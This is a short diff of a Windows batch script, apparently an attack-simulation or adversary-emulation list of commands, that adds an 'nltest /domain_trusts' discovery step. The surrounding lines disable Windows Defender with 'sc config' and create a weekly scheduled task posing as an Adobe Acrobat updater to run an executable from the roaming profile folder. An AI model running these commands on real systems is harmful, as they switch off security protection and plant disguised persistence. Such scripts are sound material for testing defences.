@@ -188,6 +188,8 @@ taskkill /F /IM calc.exe
 ECHO ============================
 taskkill /f /pid 8888
 ECHO ============================
+nltest /domain_trusts
+ECHO ============================
 sc config "windefend" start= disabled
 ECHO ============================
 "schtasks" /Create /TR "CSIDL_PROFILE\appdata\roaming\adobe\adobeup.exe" /SC WEEKLY /TN "Adobe Acrobat Reader Updater"
